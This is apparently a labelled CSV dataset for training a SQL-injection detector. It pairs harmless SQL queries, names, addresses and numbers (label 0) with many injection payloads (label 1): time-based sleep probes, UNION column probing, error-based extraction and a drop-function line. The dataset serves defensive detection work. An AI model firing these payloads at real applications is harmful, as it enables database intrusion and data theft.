Sentence,Label,Processed_Sentence
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""uosc""  =  ""uosc",1.0,"0"" or 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )   and ""uosc""  =  ""uosc"
"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0  )   where 0  =  0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
"  SELECT * FROM rich WHERE struggle NOT IN  ( 'grown', 'disappear', 'began' )  ",0.0,"  select * from rich where struggle not in  ( 'grown', 'disappear', 'began' )  "
valladolid,0.0,valladolid
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'tvcm'  =  'tvcm",1.0,"0'  )   or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   and   (  'tvcm'  =  'tvcm"
SELECT * FROM lower WHERE football  BETWEEN 10 AND 20,0.0,select * from lower where football  between 0 and 0
7020000000000000,0.0,0
select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from mysql.db  )   end  )  #
"  SELECT own AS coming, lady AS [bend]  FROM letter",0.0,"  select own as coming, lady as [bend]  from letter"
SELECT COUNT ( underline )  FROM did,0.0,select count ( underline )  from did
SELECT * FROM student WHERE wash BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from student where wash between '0-0-0' and '0-0-0'
SELECT * FROM beside ORDER BY yesterday,0.0,select * from beside order by yesterday
SELECT AVG ( perfectly ) FROM band,0.0,select avg ( perfectly ) from band
"1   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   7992  =  7992",1.0,"0   )    )    and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )   and    (    (   0  =  0"
amenta,0.0,amenta
SELECT * FROM prize 3,0.0,select * from prize 0
9.84is22nte334c799,0.0,0.0is0nte0c0
SELECT * FROM keep  WHERE attached = gate,0.0,select * from keep  where attached = gate
SELECT * FROM speed FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from speed fetch first 0 percent rows only
SELECT AVG ( they ) FROM bone,0.0,select avg ( they ) from bone
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1.0,0%' and   (  select * from   (  select  (  sleep  (  0   )    )     )  gcrr  )  #
"-3781%'  )   union all select 7497,7497,7497,7497,7497--",1.0,"-0%'  )   union all select 0,0,0,0,0--"
3636110000000000,0.0,0
"-1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#",1.0,"-0'   )    )     )   union all select 0,0,0,0,0,0#"
-5615'  )   where 5931  =  5931 or 8450  =  9229,1.0,-0'  )   where 0  =  0 or 0  =  0
SELECT try FROM load UNION ALL SELECT nervous FROM making ORDER BY solid,0.0,select try from load union all select nervous from making order by solid
SELECT kind FROM avoid UNION SELECT hurt FROM fastened ORDER BY fort,0.0,select kind from avoid union select hurt from fastened order by fort
1  )   where 9860  =  9860 and 4443  =  4111--,1.0,0  )   where 0  =  0 and 0  =  0--
4676120000000000,0.0,0
DELETE FROM pole WHERE making = 'most',0.0,delete from pole where making = 'most'
SELECT volume ( s ) FROM girl INNER JOIN,0.0,select volume ( s ) from girl inner join
"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0""  )   as qjyu where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
"camino elorrieta, 193, 2a",0.0,"camino elorrieta, 0, 0a"
"   SELECT COUNT ( nearest ) , conversation FROM jack BY he",0.0,"   select count ( nearest ) , conversation from jack by he"
"   SELECT tall, desert, market FROM soap WHERE depth  IS NULL",0.0,"   select tall, desert, market from soap where depth  is null"
32,0.0,0
15lo956i1o,0.0,0lo0i0o
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0-- ampw"
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1.0,"0%'  )   and elt  (  0  =  0,0  )   and   (  '%'  =  '"
SELECT TOP 3 * FROM production WHERE native = 'eat' SELECT * FROM orbit,0.0,select top 0 * from production where native = 'eat' select * from orbit
kellogg@viajesinternacionales.ne,0.0,kellogg@viajesinternacionales.ne
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 187 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
30388165j,0.0,0j
669143000000000,0.0,0
  )   or sleep  (  __TIME__  )    =  ',1.0,  )   or sleep  (  __time__  )    =  '
SELECT AVG ( six ) FROM join SELECT SUM ( attention ) ,0.0,select avg ( six ) from join select sum ( attention ) 
18129,0.0,0
SELECT * FROM slope,0.0,select * from slope
"  SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )  ",0.0,"  select * from nobody where vertical in  ( 'neighborhood', 'spent', 'opportunity' )  "
SELECT * FROM enjoy WHERE shirt BETWEEN 'stranger' AND 'most',0.0,select * from enjoy where shirt between 'stranger' and 'most'
SELECT * FROM question ORDER BY essential DESC,0.0,select * from question order by essential desc
SELECT AVG ( captured ) FROM pig,0.0,select avg ( captured ) from pig
SELECT COUNT ( DISTINCT receive )  FROM experiment,0.0,select count ( distinct receive )  from experiment
"SELECT * FROM river WHERE riding BETWEEN ""crack"" AND    ""skill""",0.0,"select * from river where riding between ""crack"" and    ""skill"""
SELECT * FROM  ( SELECT milk FROM opinion ) ,0.0,select * from  ( select milk from opinion ) 
40444,0.0,0
SELECT * FROM rubber FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from rubber fetch first 0 percent rows only
"calle arenys de mar, 113,",0.0,"calle arenys de mar, 0,"
"1%'   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0%'   )    )    and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
marlowe,0.0,marlowe
SELECT TOP 50 PERCENT * FROM subject SELECT * FROM people FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM building,0.0,select top 0 percent * from subject select * from people fetch first 0 percent rows onlyselect top 0 * from building
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """,1.0,"select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0 and   (  ""%""  =  """
53933880f,0.0,0f
40190,0.0,0
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,1.0,0 or 0  =    (  select 0 from pg_sleep  (  0   )    )   # awpq
44650,0.0,0
"   SELECT COUNT ( body ) , drop FROM doll BY stopped",0.0,"   select count ( body ) , drop from doll by stopped"
SELECT * FROM writing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM according,0.0,select * from writing fetch first 0 percent rows onlyselect top 0 * from according
"-2929""   )    )     )   union all select 8999,8999#",1.0,"-0""   )    )     )   union all select 0,0#"
"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",1.0,"0'||  (  select 'hvqw' from dual where 0  =  0 union all select null,null,null--"
SELECT * FROM whom WHERE popular NOT BETWEEN 'mathematics' AND 'suit',0.0,select * from whom where popular not between 'mathematics' and 'suit'
SELECT * FROM shinning WHERE remarkable = 'hung' FETCH FIRST 3 ROWS ONLY,0.0,select * from shinning where remarkable = 'hung' fetch first 0 rows only
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1.0,"0%""   )    )     )   or   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and    (    (     (  ""%""  =  """
SELECT * FROM separate,0.0,select * from separate
tchjan-lian.quadflieg@comerciosdeaspe.se,0.0,tchjan-lian.quadflieg@comerciosdeaspe.se
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1.0," select * from users where id  =  0 *\ union select null,@@version -- 0"
"INSERT INTO example  ( count, from, nor )  VALUES  ( 'blew', 'farm', 'silence' )  ",0.0,"insert into example  ( count, from, nor )  values  ( 'blew', 'farm', 'silence' )  "
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1.0,"0,  (  select   (  case when   (  0  =  0  )   then 0 else cast  (  0 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  "
autonell,0.0,autonell
-2411 or   (  8459  =  8459  )  *4906# pxwg,1.0,-0 or   (  0  =  0  )  *0# pxwg
"1""  )   as cfed where 8220  =  8220 union all select null,null,null,null,null,null,null,null,null#",1.0,"0""  )   as cfed where 0  =  0 union all select null,null,null,null,null,null,null,null,null#"
-2393%'   )    )    union all select 2772--,1.0,-0%'   )    )    union all select 0--
"1""  )   where 3058  =  3058 union all select null--",1.0,"0""  )   where 0  =  0 union all select null--"
SELECT AVG ( ourselves ) FROM bottle SELECT SUM ( back ) ,0.0,select avg ( ourselves ) from bottle select sum ( back ) 
SELECT * FROM forget WHERE compass = 'roof'  OR put = 'mother',0.0,select * from forget where compass = 'roof'  or put = 'mother'
steele-kripilani@vendomiatico.se,0.0,steele-kripilani@vendomiatico.se
"INSERT INTO trip  ( slight, organized, duck )  VALUES  ( 'made', 'previous', 'gather' )  ",0.0,"insert into trip  ( slight, organized, duck )  values  ( 'made', 'previous', 'gather' )  "
sauprobo,0.0,sauprobo
1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#,1.0,0'   )    )    as dqdv where 0  =  0 and 0  =  0#
1  )   as tbve where 4828  =  4828,1.0,0  )   as tbve where 0  =  0
"1%'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  '%'  =  '",1.0,"0%'  )   and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and   (  '%'  =  '"
SELECT TOP 3 * FROM prove WHERE south = 'early',0.0,select top 0 * from prove where south = 'early'
SELECT feet ( s FROM forty RIGHT JOIN,0.0,select feet ( s from forty right join
SELECT * FROM kill FETCH FIRST 3 ROWS ONLY,0.0,select * from kill fetch first 0 rows only
"  SELECT * FROM daily WHERE spin IN  ( 'spring', 'load', 'hold' )  ",0.0,"  select * from daily where spin in  ( 'spring', 'load', 'hold' )  "
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0 and '%'  =  '"
"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0  )   and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
SELECT * FROM stone 3 SELECT * FROM wall,0.0,select * from stone 0 select * from wall
"infantes de carrion, 122",0.0,"infantes de carrion, 0"
"olivar, 174,",0.0,"olivar, 0,"
SELECT TOP 3 * FROM certainly,0.0,select top 0 * from certainly
"  SELECT closelyID AS ID, base AS depend FROM experiment",0.0,"  select closelyid as id, base as depend from experiment"
"-8129'   )    )     )   union all select 4531,4531,4531#",1.0,"-0'   )    )     )   union all select 0,0,0#"
SELECT TOP 50 PERCENT * FROM frame SELECT * FROM swam FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM decide,0.0,select top 0 percent * from frame select * from swam fetch first 0 percent rows onlyselect top 0 * from decide
hedda,0.0,hedda
93289880v,0.0,0v
3203260000000000,0.0,0
jaworsky,0.0,jaworsky
abagail,0.0,abagail
SELECT * FROM film WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from film where price not between 0 and 0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2720' LIMIT 1,0.0,select option_value from wp_options where option_name  =  '_houzez_property_type_0' limit 0
vento8eda4,0.0,vento0eda0
SELECT * FROM toward FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from toward fetch first 0 percent rows only
"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1.0,"-0'   )    )    or 0 group by concat  (  0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )    having min  (  0  )  #"
if  (  8537  =  7034  )   select 8537 else drop function vqmp--,1.0,if  (  0  =  0  )   select 0 else drop function vqmp--
"  SELECT * FROM trace WHERE slave NOT IN  ( 'light', 'tax', 'bite' )  ",0.0,"  select * from trace where slave not in  ( 'light', 'tax', 'bite' )  "
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1.0,"0%""  )   and   (  select * from   (  select  (  sleep  (  0   )    )     )  gcrr  )  #"
SELECT TOP 3 * FROM twenty WHERE word = 'research',0.0,select top 0 * from twenty where word = 'research'
46177,0.0,0
-8878' in boolean mode  )   union all select 7785#,1.0,-0' in boolean mode  )   union all select 0#
SELECT * FROM found WHERE NOT greatest = 'none'  AND NOT or = 'dream',0.0,select * from found where not greatest = 'none'  and not or = 'dream'
SELECT * FROM together WHERE somehow = 'previous',0.0,select * from together where somehow = 'previous'
"1,  (  case when 8260  =  8260 then 1 else null end  )  ",1.0,"0,  (  case when 0  =  0 then 0 else null end  )  "
duran manero,0.0,duran manero
SELECT TOP 50 PERCENT * FROM thy,0.0,select top 0 percent * from thy
SELECT * FROM spring,0.0,select * from spring
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",1.0,"0'  )   or elt  (  0  =  0,sleep  (  0   )    )    and   (  'tmbs'  =  'tmbs"
almirall pahisa,0.0,almirall pahisa
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw",1.0,"0""   )    )    and 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw"
1%'   )    )     )   union all select null#,1.0,0%'   )    )     )   union all select null#
SELECT TOP 3 * FROM higher,0.0,select top 0 * from higher
min81t8,0.0,min0t0
1' where 1628  =  1628,1.0,0' where 0  =  0
es3an7oso,0.0,es0an0oso
"  UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted",0.0,"  update cry set feel =  'operation', city =  'stage' where wrapped =  melted"
kangelis,0.0,kangelis
SELECT * FROM born WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from born where price not between 0 and 0
3o7za732,0.0,0o0za0
6208,0.0,0
"calle valsendero, 48,",0.0,"calle valsendero, 0,"
SELECT * FROM thought 3,0.0,select * from thought 0
SELECT AVG ( myself )  FROM phrase  SELECT SUM ( track ) ,0.0,select avg ( myself )  from phrase  select sum ( track ) 
SELECT TOP 3 * FROM could SELECT * FROM pressure 3SELECT * FROM seen,0.0,select top 0 * from could select * from pressure 0select * from seen
"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1.0,"0   )    )    as rual where 0  =  0 and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  --"
